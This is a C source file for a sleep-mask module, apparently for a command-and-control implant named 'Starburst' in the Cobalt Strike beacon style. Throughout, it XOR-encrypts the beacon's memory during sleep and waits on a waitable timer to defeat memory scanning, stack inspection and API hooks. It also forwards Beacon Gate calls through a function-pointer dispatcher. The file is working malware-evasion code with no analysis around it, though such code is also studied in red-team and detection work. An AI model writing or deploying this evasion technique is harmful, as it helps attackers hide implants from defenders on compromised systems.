#include <sleepmask.h>

/*
 * Starburst Sleepmask-VS: Timer-based Sleep
 *
 * Replaces the direct WaitForSingleObject sleep with a waitable timer.
 * The beacon thread blocks on a timer object rather than calling the
 * queued sleep API directly. This changes the wait target from a thread
 * handle to a timer, producing a different call stack and making the
 * sleep harder to attribute via hooks or stack inspection.
 *
 * Beacon Gate calls (bMask FALSE) are dispatched normally.
 */

WINBASEAPI HANDLE WINAPI KERNEL32$CreateWaitableTimerW( LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR );
WINBASEAPI BOOL   WINAPI KERNEL32$SetWaitableTimer( HANDLE, const LARGE_INTEGER*, LONG, PVOID, PVOID, BOOL );
WINBASEAPI DWORD  WINAPI KERNEL32$WaitForSingleObject( HANDLE, DWORD );
WINBASEAPI BOOL   WINAPI KERNEL32$CloseHandle( HANDLE );

#define CreateWaitableTimerW KERNEL32$CreateWaitableTimerW
#define SetWaitableTimer     KERNEL32$SetWaitableTimer
#define WaitForSingleObject  KERNEL32$WaitForSingleObject
#define CloseHandle          KERNEL32$CloseHandle

/* XOR a memory region with a rolling key */
static void xor_region( unsigned char *buf, unsigned int len, unsigned char *key, unsigned int key_len ) {
    for ( unsigned int i = 0; i < len; i++ ) {
        buf[i] ^= key[i % key_len];
    }
}

/* Execute a FUNCTION_CALL via its typed pointer */
static ULONG_PTR dispatch_call( PFUNCTION_CALL fc ) {
    ULONG_PTR ret = 0;

    switch ( fc->numOfArgs ) {
        case 0:  ret = ((BEACON_GATE_00) fc->functionPtr)(); break;
        case 1:  ret = ((BEACON_GATE_01) fc->functionPtr)( fc->args[0] ); break;
        case 2:  ret = ((BEACON_GATE_02) fc->functionPtr)( fc->args[0], fc->args[1] ); break;
        case 3:  ret = ((BEACON_GATE_03) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2] ); break;
        case 4:  ret = ((BEACON_GATE_04) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3] ); break;
        case 5:  ret = ((BEACON_GATE_05) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4] ); break;
        case 6:  ret = ((BEACON_GATE_06) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5] ); break;
        case 7:  ret = ((BEACON_GATE_07) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6] ); break;
        case 8:  ret = ((BEACON_GATE_08) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6], fc->args[7] ); break;
        case 9:  ret = ((BEACON_GATE_09) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6], fc->args[7], fc->args[8] ); break;
        case 10: ret = ((BEACON_GATE_10) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6], fc->args[7], fc->args[8], fc->args[9] ); break;
    }

    return ret;
}

/* Extract sleep duration (ms) from the queued function call */
static DWORD get_sleep_ms( PFUNCTION_CALL fc ) {
    switch ( fc->function ) {
        case WAITFORSINGLEOBJECT:
            /* WaitForSingleObject( handle, dwMilliseconds ) */
            return (DWORD) fc->args[1];
        case SLEEP:
            /* Sleep( dwMilliseconds ) */
            return (DWORD) fc->args[0];
        default:
            return (DWORD) fc->args[0];
    }
}

/*
 * sleep_mask - Entry point called by the Starburst agent.
 *
 * beaconInfo:    describes the beacon image, heap records, and memory regions
 * functionCall:  the API call to execute (with optional masking)
 */
VOID sleep_mask( PSM_BEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {

    if ( ! functionCall )
        return;

    if ( ! functionCall->bMask ) {
        /* Beacon Gate path: execute the call without masking */
        functionCall->retValue = dispatch_call( functionCall );
        return;
    }

    /*
     * Timer-based sleep path.
     *
     * Instead of dispatching the queued WaitForSingleObject/Sleep call,
     * create a waitable timer set to the same duration and block on it.
     * The thread waits on a timer object, not a thread handle, which
     * changes what a stack walk or NtWaitForSingleObject hook observes.
     */

    unsigned char *key     = beaconInfo->rc4_key;
    unsigned int   key_len = 16;

    DWORD sleep_ms = get_sleep_ms( functionCall );

    /* -- Mask: XOR all beacon memory regions -- */
    for ( int i = 0; i < beaconInfo->region_count; i++ ) {
        if ( beaconInfo->regions[i].base && beaconInfo->regions[i].size ) {
            xor_region(
                (unsigned char *) beaconInfo->regions[i].base,
                beaconInfo->regions[i].size,
                key, key_len
            );
        }
    }

    /* -- Sleep via waitable timer -- */
    HANDLE hTimer = CreateWaitableTimerW( NULL, TRUE, NULL );
    if ( hTimer ) {
        LARGE_INTEGER due;
        due.QuadPart = -( (LONGLONG) sleep_ms * 10000 );

        if ( SetWaitableTimer( hTimer, &due, 0, NULL, NULL, FALSE ) ) {
            WaitForSingleObject( hTimer, INFINITE );
        }

        CloseHandle( hTimer );
    }

    functionCall->retValue = 0;

    /* -- Unmask: XOR again to restore -- */
    for ( int i = 0; i < beaconInfo->region_count; i++ ) {
        if ( beaconInfo->regions[i].base && beaconInfo->regions[i].size ) {
            xor_region(
                (unsigned char *) beaconInfo->regions[i].base,
                beaconInfo->regions[i].size,
                key, key_len
            );
        }
    }
}
